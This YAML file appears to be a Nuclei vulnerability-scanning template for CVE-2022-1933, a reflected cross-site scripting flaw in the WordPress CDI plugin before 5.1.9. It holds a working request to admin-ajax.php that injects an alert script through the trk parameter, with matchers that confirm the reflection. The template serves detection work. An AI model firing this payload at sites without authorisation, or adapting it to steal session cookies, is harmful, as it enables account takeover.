id: CVE-2022-1933
info:
  author: Akincibor
  classification:
    cve-id: CVE-2022-1933
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'WordPress CDI plugin prior to 5.1.9 contains a cross-site scripting
    vulnerability. The plugin does not sanitize and escape a parameter before outputting
    it back in the response of an AJAX action. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site. This
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.

    '
  metadata:
    verified: 'true'
  name: WordPress CDI <5.1.9 - Cross Site Scripting
  reference:
  - https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf
  - https://wordpress.org/plugins/collect-and-deliver-interface-for-woocommerce/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1933
  severity: medium
  tags: cdi,wpscan,cve,cve2022,wp-plugin,wp,wordpress,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - Tracking code not correct
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E'
